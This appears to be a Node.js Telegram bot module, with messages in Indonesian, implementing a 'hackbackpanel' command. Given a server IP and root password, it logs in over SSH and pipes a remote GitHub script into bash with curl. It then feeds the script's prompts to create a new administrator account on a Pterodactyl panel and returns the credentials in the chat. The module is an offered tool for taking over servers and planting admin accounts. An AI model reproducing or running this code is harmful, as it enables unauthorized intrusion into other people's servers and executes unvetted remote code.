const { Client } = require('ssh2');
const { OWNER_ID } = require('../config');

function getRandom(ext = '') {
  return Math.floor(Math.random() * 9999).toString().padStart(4, '0') + ext;
}

module.exports = (bot) => {
  bot.command(['hbpanel', 'hackbackpanel'], async (ctx) => {
    if (!OWNER_ID.includes(ctx.from.id)) {
      return ctx.reply('🚫 Kamu tidak diizinkan menggunakan perintah ini.');
    }

    const text = ctx.message.text.split(' ').slice(1).join(' ');
    const t = text.split('|');
    if (t.length < 2) {
      return ctx.reply(`Contoh: hbpanel 192.168.1.1|password`);
    }

    await ctx.replyWithChatAction('typing');

    const ipvps = t[0].trim();
    const passwd = t[1].trim();
    const newuser = 'admin' + getRandom();
    const newpw = 'admin' + getRandom();

    const connSettings = {
      host: ipvps,
      port: 22,
      username: 'root',
      password: passwd,
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ssh = new Client();

    ssh.on('ready', () => {
      ssh.exec(command, (err, stream) => {
        if (err) return ctx.reply('Gagal menjalankan perintah.');

        stream.on('close', async () => {
          const result = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
👤 *Username:* \`${newuser}\`
🔑 *Password:* \`${newpw}\`
          `.trim();

          await ctx.replyWithMarkdown(result);
          ssh.end();
        });

        stream.on('data', (data) => {
          console.log('[DATA]', data.toString());
        });

        stream.stderr.on('data', () => {
          stream.write('7\n');
          stream.write(`${newuser}\n`);
          stream.write(`${newpw}\n`);
        });
      });
    });

    ssh.on('error', (err) => {
      console.error('[SSH ERROR]', err.message);
      ctx.reply('❌ Katasandi atau IP tidak valid.');
    });

    ssh.connect(connSettings);
  });
};